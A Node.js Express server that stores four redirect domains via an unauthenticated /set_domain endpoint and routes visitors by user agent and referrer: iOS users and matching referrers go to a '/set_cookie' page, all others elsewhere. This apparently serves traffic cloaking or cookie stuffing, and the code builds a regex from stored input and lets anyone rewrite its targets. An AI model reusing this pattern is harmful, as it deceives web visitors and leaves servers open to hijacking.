const express = require('express')
const fs = require('fs')
const path = require('path')

const filePath = path.resolve(__dirname, '../domains.db');
//setup express app
const app = express()

app.get('/.well-known/acme-challenge/n3btGLuVuGqLy47pq5JabFj_wnCPCUrQKsewYf0IHQE', (req, res) => {
    res.sendFile('/root/.well-known/acme-challenge/n3btGLuVuGqLy47pq5JabFj_wnCPCUrQKsewYf0IHQE');
});
app.get('/.well-known/acme-challenge/SxIcChQAa58mc-ylqWQjrq9dExyHK4grpKfYNoyKl90', (req, res) => {
    res.sendFile('/root/.well-known/acme-challenge/SxIcChQAa58mc-ylqWQjrq9dExyHK4grpKfYNoyKl90');
});
const DeviceDetector = require('node-device-detector');
const detector = new DeviceDetector;

app.get('/set_domain', (req, res) => {
    const { refDomain, specDomain, clientDomain, cookieCheckDomain } = req.query;
    console.log(req.query)
    fs.writeFile(filePath, refDomain +
        '|||||||' + specDomain +
        '|||||||' + clientDomain +
        '|||||||' + cookieCheckDomain,
        err => { });
    res.json('success')
})

app.get('/redirecting', (req, res) => {
    const ref = req.query.ref;
    const detectResult = detector.detect(req.headers['user-agent']);
    if (fs.existsSync(filePath)) {
        const refer = fs.readFileSync(filePath, 'utf8').split("|||||||");

        const reg = new RegExp(refer[0].trim(), 'gi');
        if (detectResult.os.name == 'iOS') {
            res.status(200).redirect(refer[2].trim() + '/set_cookie');
        }
        else if (ref.match(reg)) {
            res.render('set.pug', { client: refer[2].trim() + '/set_cookie' });
        } else {
            res.status(200).redirect(refer[1].trim());
        }
    }
    else {
        res.json('Not found');
    }
})
//set a simple for homepage route
app.get('*', (req, res) => {
    res.sendFile(path.resolve(__dirname, '../client', 'index.html'));
});

//server listening to port 8000
app.listen(8000, () => console.log('The server is running port 8000...'));

